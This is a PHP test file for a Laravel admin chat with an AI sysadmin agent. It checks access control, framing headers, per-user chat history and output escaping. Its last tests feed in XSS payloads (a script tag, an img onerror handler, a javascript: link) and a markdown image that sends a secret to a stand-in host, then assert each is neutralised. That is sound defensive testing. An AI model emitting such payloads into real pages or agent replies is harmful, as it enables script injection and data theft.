<?php

use App\Ai\Agents\SysadminAgent;
use App\Ai\ScanRunner;
use App\Livewire\MachineChat;
use App\Models\AgentRun;
use App\Models\ChatMessage;
use App\Models\Machine;
use App\Models\User;
use App\Sharp\Entities\MachineEntity;
use App\Support\SafeMarkdown;
use Code16\Sharp\Utils\Testing\SharpAssertions;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Route;
use Laravel\Ai\Streaming\Events\TextDelta;
use Livewire\Livewire;
use Tests\TestCase;

uses(TestCase::class, RefreshDatabase::class, SharpAssertions::class);

it('protects the chat page and the livewire endpoint with the Sharp auth middleware', function () {
    foreach (['sentinel.chat', 'sentinel.livewire.update'] as $name) {
        expect(Route::getRoutes()->getByName($name)->gatherMiddleware())->toContain('sharp_auth', 'sharp_common');
    }
});

it('does not serve the chat to guests', function () {
    $machine = Machine::factory()->create();

    $this->get(route('sentinel.chat', $machine))->assertRedirect()->assertDontSee($machine->name);
    $this->postJson(route('sentinel.livewire.update'), ['components' => []])->assertRedirect();
});

it('keeps non-admin users out of the chat, its Livewire endpoint and the back-office', function () {
    $machine = Machine::factory()->create();
    $this->actingAs(User::factory()->create());

    $this->get(route('sentinel.chat', $machine))->assertRedirect()->assertDontSee($machine->name);
    $this->postJson(route('sentinel.livewire.update'), ['components' => []])->assertRedirect();
});

it('never lets is_admin be mass assigned', function () {
    $user = User::create(['name' => 'x', 'email' => 'x@example.org', 'password' => 'secret', 'is_admin' => true]);

    expect($user->fresh()->is_admin)->toBeFalse();
});

it('can only be framed by the same origin', function () {
    $this->actingAs(User::factory()->admin()->create());

    $this->get(route('sentinel.chat', Machine::factory()->create()))
        ->assertOk()
        ->assertHeader('Content-Security-Policy', "frame-ancestors 'self'")
        ->assertHeader('X-Frame-Options', 'SAMEORIGIN');
});

it('is embedded as an iframe in the machine show page', function () {
    $this->actingAs(User::factory()->admin()->create());
    $machine = Machine::factory()->create();

    $this->sharpShow(MachineEntity::class, $machine->id)->get()
        ->assertShowData(fn ($json) => $json->where('chat', fn ($html) => str_contains($html, '<iframe src="/chat/'.$machine->id.'"'))->etc());
});

it('answers through the agent and keeps the conversation per user', function () {
    SysadminAgent::fake(['Disk usage is fine.']);
    $user = User::factory()->admin()->create();
    $machine = Machine::factory()->create();
    $this->actingAs($user);

    Livewire::test(MachineChat::class, ['machine' => $machine])
        ->set('message', 'How is the disk?')
        ->call('send')
        ->assertSee('How is the disk?')
        ->assertSee('Disk usage is fine.')
        ->assertSet('message', '');

    expect(ChatMessage::where('user_id', $user->id)->pluck('role')->all())->toBe(['user', 'assistant'])
        ->and(AgentRun::first()->objective)->toBe('How is the disk?');

    $other = User::factory()->admin()->create();
    $this->actingAs($other);
    Livewire::test(MachineChat::class, ['machine' => $machine])->assertDontSee('How is the disk?');
});

it('validates and escapes messages', function () {
    $this->actingAs(User::factory()->admin()->create());
    $machine = Machine::factory()->create();
    ChatMessage::create(['machine_id' => $machine->id, 'user_id' => auth()->id(), 'role' => 'assistant', 'content' => '<script>alert(1)</script>']);

    Livewire::test(MachineChat::class, ['machine' => $machine])
        ->assertDontSeeHtml('<script>alert(1)</script>')
        ->set('message', '')->call('send')->assertHasErrors('message');
});

it('emits streaming events to the callback and stores the final answer', function () {
    SysadminAgent::fake(['Streamed answer.']);
    $deltas = '';

    $run = app(ScanRunner::class)->reply(Machine::factory()->create(), 'hello', [], function ($event) use (&$deltas) {
        if ($event instanceof TextDelta) {
            $deltas .= $event->delta;
        }
    });

    expect($deltas)->toBe('Streamed answer.')
        ->and($run->status)->toBe('completed')
        ->and($run->report)->toBe('Streamed answer.');
});

it('renders markdown safely: formatting kept, raw html escaped, images and unsafe links neutralised', function () {
    $html = SafeMarkdown::render("**bold** and `code`\n\n- one\n- two\n\n<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n![t](https://evil.test/leak?d=secret)\n\n[bad](javascript:alert(1)) [ok](https://example.com)");

    expect($html)->toContain('<strong>bold</strong>', '<code>code</code>', '<li>one</li>', 'href="https://example.com"', 'rel="')
        ->not->toContain('<script', '<img', 'javascript:', 'evil.test/leak?')
        ->toContain('&lt;script&gt;');
});
